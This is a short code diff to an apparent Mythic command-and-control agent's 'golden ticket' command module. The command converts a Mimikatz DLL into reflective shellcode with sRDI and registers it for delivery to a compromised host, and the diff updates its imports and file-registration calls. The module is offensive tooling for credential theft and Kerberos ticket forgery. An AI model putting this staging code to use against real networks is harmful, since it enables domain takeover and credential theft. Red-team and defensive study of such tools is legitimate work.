@@ -1,9 +1,9 @@
-from CommandBase import *
+from mythic_payloadtype_container.MythicCommandBase import *
 import json
 from uuid import uuid4
 from sRDI import ShellcodeRDI
 from os import path
-from MythicFileRPC import *
+from mythic_payloadtype_container.MythicRPC import *
 
 
 class GoldenTicketArguments(TaskArguments):
@@ -56,11 +56,15 @@ class GoldenTicketCommand(CommandBase):
         dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
         dllBytes = open(dllFile, 'rb').read()
         converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
-        file_resp = await MythicFileRPC(task).register_file(converted_dll)
+        file_resp = await MythicRPC().execute("create_file",
+                                              task_id=task.id,
+                                              file=base64.b64encode(converted_dll).decode(),
+                                              delete_after_fetch=True)
         if file_resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", file_resp.agent_file_id)
+            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
         else:
-            raise Exception("Failed to register Mimikatz DLL: " + file_resp.error_message)
+            raise Exception("Failed to register Mimikatz DLL: " + file_resp.error)
+        # task.display_params = "/dc:{} /domain:{} /user:{}".format(self.args.get_arg)
         return task
 
     async def process_response(self, response: AgentResponse):
